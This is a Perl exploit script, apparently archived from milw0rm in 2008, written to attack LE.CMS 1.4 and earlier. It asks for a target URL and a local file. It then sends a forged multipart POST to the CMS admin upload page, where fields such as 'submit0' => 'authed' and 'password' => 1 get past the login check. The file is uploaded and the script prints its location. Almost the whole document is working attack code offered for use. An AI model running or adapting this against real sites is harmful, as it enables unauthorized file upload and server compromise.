@@ -1,0 +1,47 @@
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+use LWP::UserAgent;
+use HTTP::Request::Common;
+
+print <<INTRO;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - -
+- LE.CMS <= 1.4 Remote Arbitrary File Upload Exploit  -
+-                                                     -
+ -                                                   - 
+  -        Discovered && Coded By: t0pP8uZz         -    
+   -          Discovered On: 19 JUNE 2008          -
+   -                                               -
+  -     Script Download: http://worldlevel.com      -
+ -   milw0rm.com, h4ck-y0u.org, CiperCrew, offsec    -
+ -                                                   -
+- LE.CMS suffers from a arbitrary file upload vuln..  -
+- .. this exploit will upload any file to the server  -
+- - - - - - - - - - - - - - - - - - - - - - - - - - - -
+INTRO
+
+print "\nEnter Target URL(ie: http://site.com): ";
+    chomp(my $host=<STDIN>);
+    
+print "\nEnter Local File Path To Upload(ie: C:\\file.txt): ";
+    chomp(my $file=<STDIN>);
+
+my $ext   = substr $file, rindex $file, '.';
+my $fname = int rand 9999;
+my $ua    = LWP::UserAgent->new( agent => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)', cookie_jar => {} );
+
+my $re = $ua->request(POST $host . '/cms/admin/upload.php',
+                        Content_Type =>   'form-data',
+                        Content      => [ 'submit0'  => 'authed', # if script reads this as TRUE then the script thinks we have already authenticated the username/password, only 0 or undef is false
+                                          'submit'   => 1, 
+                                          'password' => 1, # as long as this is true we should be able to upload
+                                          'filename' => $fname,
+                                          'upload'   => [ $file ] ] );
+
+die "Exploit Failed, HTTP Request Failed!" unless $re->is_success;
+
+print "File Uploaded! Location: " . $host . "/cms/images/" . $fname . $ext . "\n";
+exit;
+
+# milw0rm.com [2008-06-21]
